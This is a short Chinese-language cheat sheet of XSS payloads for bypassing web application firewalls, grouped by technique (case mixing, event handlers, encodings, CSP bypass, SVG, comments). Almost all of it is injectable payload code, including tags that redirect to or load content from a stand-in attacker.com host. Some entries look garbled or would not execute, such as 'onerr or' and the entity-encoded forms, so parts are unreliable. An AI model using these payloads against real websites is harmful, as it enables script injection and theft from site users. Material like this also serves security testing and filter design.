# XSS WAF绕过

## 标签绕过

### 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x onerror=alert(1)>
```

### 标签替换

```html
<script/x>alert(1)</script>
<script\x>alert(1)</script>
```

## 事件处理器绕过

### 事件名混淆

```html
<img src=x onerr or=alert(1)>
<img src=x onerror=alert(1)>
```

### 罕见事件

```html
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
```

## 编码绕过

### HTML实体编码

```html
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
```

### URL编码

```html
%3Cscript%3Ealert(1)%3C/script%3E
```

### Unicode编码

```html
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### 混合编码

```html
<scr\x69pt>alert(1)</script>
```

## CSP绕过

### base标签

```html
<base href="http://attacker.com/">
```

### meta标签

```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/">
```

### link标签

```html
<link rel="import" href="http://attacker.com/">
```

## 标签绕过

### SVG绕过

```html
<svg><animate onbegin=alert(1) attributeName=x>
<svg><script>alert(1)</script>
```

### 绕过script标签过滤

```html
<script/src=data:,alert(1)>
<img src="x" onerror="alert(1)">
```

## 其他技巧

### 空格填充

```html
<script>alert(1)</script>
<script /  >alert(1)</script>
```

### 注释绕过

```html
<!--><script>alert(1)</script>-->
```
